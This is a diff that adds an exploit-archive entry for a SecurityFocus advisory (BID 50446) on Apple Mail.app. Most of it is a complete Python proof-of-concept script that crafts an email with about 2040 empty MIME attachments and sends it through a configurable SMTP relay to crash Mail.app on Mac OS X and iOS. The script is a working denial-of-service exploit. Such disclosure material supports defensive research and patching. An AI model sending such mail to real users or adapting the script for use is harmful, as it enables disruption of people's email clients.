@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/50446/info
+
+Apple Mac OS X and iOS are prone to a denial-of-service vulnerability.
+
+Attackers can exploit this issue to cause the affected mail client to crash, effectively denying service. 
+
+#!/usr/bin/env python
+
+# Mail of death for Apple's Mail.app
+#
+# Tested & vulnerable:  Leopard/Intel, Snow Leopard, Lion (up to 10.7.2), IOS 4.2.x, 4.3.3
+# Tested != vulnerable: Leopard/PPC
+# Create mail with n_attach MIME attachments
+# Version 1.0; shebang42
+
+import smtplib
+
+n_attach=2040 # ~2024 is sufficient
+relay='your.mta.goes.here'
+mailfrom = 'mail_of_death@example.com'
+mailto = mailfrom
+subject = 'PoC Apple Mail.app mail of death'
+date = 'October 29, 2011 10:00:00 GMT'
+
+
+def craft_mail():
+    header = 'From: %s\nTo: %s\nSubject: %s\nDate: %s\nContent-Type: multipart/mixed ; boundary="delim"\n\n' % (mailfrom, mailto, subject, date)
+    body = '--delim\nContent-Type: text/plain\nContent-Disposition: inline\n\nHello World\nBye Mail.app\n\n\n'
+    attach = '--delim\nContent-Disposition: inline\n\n'*n_attach
+
+    ### Another, slightly longer option to crash Mail.app (same bug)
+    # attach = '--delim\nContent-Type: text/plain\nContent-Disposition: attachment; filename=AAAAAAAA\n\ncontent\n'*n_attach
+    return header + body + attach
+
+
+def send_mail(mail):
+    server = smtplib.SMTP(relay)
+    server.sendmail(mailfrom, mailto, mail)
+    server.quit()
+
+mail=craft_mail()
+#print mail
+send_mail (mail)
